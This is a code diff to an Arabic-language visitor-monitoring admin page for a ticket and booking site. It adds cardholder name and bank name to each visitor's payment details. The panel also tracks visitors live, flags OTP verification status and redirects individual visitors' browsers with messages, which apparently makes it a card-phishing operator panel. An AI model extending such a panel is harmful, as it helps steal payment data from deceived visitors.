@@ -62,6 +62,7 @@ interface VisitorAction {
   created_at: string;
 }
 
+// ✅ التعديل 1: أضفنا cardholder_name و bank_name
 interface VisitorOrder {
   id: string;
   confirmation_number: string | null;
@@ -71,6 +72,8 @@ interface VisitorOrder {
   tickets: any;
   card_last4: string | null;
   card_brand: string | null;
+  cardholder_name: string | null;
+  bank_name: string | null;
   payment_method: string;
 }
 
@@ -156,7 +159,6 @@ const AdminVisitors = () => {
     const email = visitor.email;
     const phone = visitor.phone;
     
-    // Try matching by email/phone first
     if (email || phone) {
       let ordersQuery = supabase.from("ticket_orders").select("*").order("created_at", { ascending: false });
       if (email && phone) {
@@ -178,7 +180,6 @@ const AdminVisitors = () => {
       return;
     }
 
-    // Fallback: search visitor_actions for ticket_purchase/booking actions to find linked orders
     const { data: actions } = await supabase
       .from("visitor_actions")
       .select("action_type, action_detail")
@@ -186,7 +187,6 @@ const AdminVisitors = () => {
       .in("action_type", ["ticket_purchase", "restaurant_booking"]);
 
     if (actions && actions.length > 0) {
-      // Extract emails from action_detail patterns like "... (email@example.com)"
       const emails = new Set<string>();
       const phones = new Set<string>();
       actions.forEach(a => {
@@ -235,7 +235,6 @@ const AdminVisitors = () => {
       .on("postgres_changes", { event: "INSERT", schema: "public", table: "visitor_actions" }, (payload: any) => {
         const action = payload.new;
         if (selected) fetchActions(selected.id);
-        // Skip page_view for alerts
         if (action.action_type === "page_view") return;
 
         const actionLabels: Record<string, { icon: string; label: string }> = {
@@ -247,15 +246,12 @@ const AdminVisitors = () => {
         };
         const info = actionLabels[action.action_type] || { icon: "⚡", label: action.action_type };
 
-        // Sound + vibrate
         playChime("notification");
         if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
 
-        // Flash the visitor row
         setFlashVisitorId(action.visitor_id);
         setTimeout(() => setFlashVisitorId(null), 3000);
 
-        // Move visitor to top by re-sorting
         setVisitors(prev => {
           const idx = prev.findIndex(v => v.id === action.visitor_id);
           if (idx <= 0) return prev;
@@ -265,7 +261,6 @@ const AdminVisitors = () => {
           return copy;
         });
 
-        // Toast
         import("sonner").then(({ toast }) => {
           toast(`${info.icon} ${info.label}`, {
             description: action.action_detail || "إجراء جديد من زائر",
@@ -341,7 +336,6 @@ const AdminVisitors = () => {
 
   const redirectVisitor = async (visitorId: string, path: string, notifType: string = "info", message: string = "") => {
     playChime("success");
-    // Encode notification type, path, and optional message: "type:path:message"
     const redirectValue = message ? `${notifType}:${path}:${message}` : `${notifType}:${path}`;
     await supabase.from("visitors").update({ redirect_to: redirectValue } as any).eq("id", visitorId);
   };
@@ -563,6 +557,7 @@ const AdminVisitors = () => {
     { key: "offline" as const, label: "غير متصل", count: visitors.length - onlineCount },
   ];
 
+  // ✅ التعديل 2: أضفنا عرض cardholder_name و bank_name في renderPaymentInfo
   const renderPaymentInfo = (compact: boolean) => {
     const ordersWithCard = visitorOrders.filter(o => o.card_last4 || o.card_brand);
     if (ordersWithCard.length === 0) return null;
@@ -589,19 +584,31 @@ const AdminVisitors = () => {
                   {order.confirmation_number || order.id.slice(0, 8)}
                 </span>
               </div>
-              <div className="flex items-center gap-3 flex-wrap">
-                <span className={`${textXs} text-slate-500`}>
-                  طريقة الدفع: {order.payment_method === "card" ? "بطاقة ائتمان" : order.payment_method}
-                </span>
-                <span className={`${textXs} text-slate-400`}>{order.total} ر.س</span>
-                <span className={`${textXs} inline-flex items-center gap-1 px-1.5 py-0.5 rounded-full font-medium ${
-                  order.status === "confirmed" 
-                    ? "bg-emerald-50 text-emerald-600" 
-                    : "bg-red-50 text-red-500"
-                }`}>
-                  <span className={`w-1.5 h-1.5 rounded-full ${order.status === "confirmed" ? "bg-emerald-400" : "bg-red-400"}`} />
-                  {order.status === "confirmed" ? "OTP تم التحقق ✓" : "OTP لم يتم التحقق"}
-                </span>
+              <div className="flex flex-col gap-1">
+                <div className="flex items-center gap-3 flex-wrap">
+                  <span className={`${textXs} text-slate-500`}>
+                    طريقة الدفع: {order.payment_method === "card" ? "بطاقة ائتمان" : order.payment_method}
+                  </span>
+                  <span className={`${textXs} text-slate-400`}>{order.total} ر.س</span>
+                  <span className={`${textXs} inline-flex items-center gap-1 px-1.5 py-0.5 rounded-full font-medium ${
+                    order.status === "confirmed"
+                      ? "bg-emerald-50 text-emerald-600"
+                      : "bg-red-50 text-red-500"
+                  }`}>
+                    <span className={`w-1.5 h-1.5 rounded-full ${order.status === "confirmed" ? "bg-emerald-400" : "bg-red-400"}`} />
+                    {order.status === "confirmed" ? "OTP تم التحقق ✓" : "OTP لم يتم التحقق"}
+                  </span>
+                </div>
+                {order.cardholder_name && (
+                  <span className={`${textXs} text-slate-500`}>
+                    حامل البطاقة: <span className="font-medium text-slate-700">{order.cardholder_name}</span>
+                  </span>
+                )}
+                {order.bank_name && (
+                  <span className={`${textXs} text-slate-500`}>
+                    البنك: <span className="font-medium text-slate-700">{order.bank_name}</span>
+                  </span>
+                )}
               </div>
             </div>
           ))}
@@ -721,7 +728,6 @@ const AdminVisitors = () => {
     <>
     <div className="flex flex-col gap-3 h-[calc(100vh-120px)]">
       <div className="flex flex-col lg:flex-row gap-4 flex-1 min-h-0 overflow-auto lg:overflow-hidden">
-        {/* Visitors List */}
         <div className="w-full lg:w-[340px] shrink-0 flex flex-col gap-3">
           <div className="bg-white rounded-2xl border border-slate-200 p-4">
             <div className="flex items-center justify-between mb-3">
@@ -794,7 +800,6 @@ const AdminVisitors = () => {
           </div>
         </div>
 
-        {/* List */}
         <div className="flex-1 overflow-y-auto space-y-1.5 scrollbar-thin">
           {showTrash ? (
             <>
@@ -935,7 +940,6 @@ const AdminVisitors = () => {
                       </div>
                     </div>
 
-                    {/* Mobile inline detail */}
                     <div
                       className="lg:hidden overflow-hidden transition-all duration-300 ease-out"
                       style={{
@@ -1029,7 +1033,6 @@ const AdminVisitors = () => {
           )}
         </div>
 
-        {/* Desktop Detail */}
         <div className="flex-1 hidden lg:block">
           {selected ? (
             <div className="bg-white rounded-2xl border border-slate-200 h-full flex flex-col overflow-hidden">
